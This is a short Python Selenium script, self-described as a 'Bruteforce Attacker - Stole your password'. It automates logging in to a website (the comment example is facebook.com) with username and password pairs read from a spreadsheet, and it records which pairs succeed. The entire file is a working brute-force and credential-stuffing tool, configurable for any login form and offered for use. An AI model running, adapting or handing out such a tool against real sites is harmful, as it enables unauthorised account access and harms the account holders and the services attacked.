#!/usr/bin/env python3
import utils
import argparse
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from selenium.webdriver.common.keys import Keys

parser=argparse.ArgumentParser(description="Bruteforce Attacker - Stole your password")
parser.add_argument('-v','--version',action='version',version='%(prog)s 1.0')
parser.add_argument('url',type=str,help="Url of the Website")
parser.add_argument('name_email',type=str,help="Move your cursor to email column and click on inspect Element and copy name of email element")
parser.add_argument('name_pass',type=str,help="Move your cursor to password column and click on inspect Element and copy name of password element")
parser.add_argument('xpath_login',type=str,help="Move your cursor to login/Signin button and click on inspect Element and copy xpath of button element")
parser.add_argument('title',type=str,help="Title of page that open after successful in login")
parser.add_argument('filePath',type=str,help="file name containing Usernames and Password in xlsx format")
parser.add_argument('fireFox_path',type=str,help="Your firefox browser path")

args=parser.parse_args()

binary =FirefoxBinary(args.fireFox_path)
#Like in my os --->binary =FirefoxBinary('/etc/firefox/firefox')
driver=webdriver.Firefox(firefox_binary=binary)

driver.get(args.url)
#Eg --> driver.get("https://facebook.com/")
print("Opening the Url")

path=args.filePath

#Eg --> path=test1.xlsx"
row=utils.countRow(path,'Sheet1')
column=utils.countColumn(path,'Sheet1')
for r in range(1,row+1):
	userName=utils.ReadData(path,'Sheet1',r,1)
	password=utils.ReadData(path,'Sheet1',r,2)
	driver.implicitly_wait(10)
	driver.find_element_by_name(args.name_email).clear()
	driver.find_element_by_name(args.name_pass).clear()

	driver.find_element_by_name(args.name_email).send_keys(userName)
	driver.find_element_by_name(args.name_pass).send_keys(password)
	print("Login Id and PassWord Entered")
	driver.find_element_by_xpath(args.xpath_login).click()
	driver.implicitly_wait(10)
	if driver.title==args.title:
		print("Test is pass")
		utils.WriteData(path,'Sheet1',r,3,"Pass")
		driver.get(args.url)
	else:
		driver.back()
		utils.WriteData(path,'Sheet1',r,3,"Fail")
		print("Test is Fail")
driver.close()
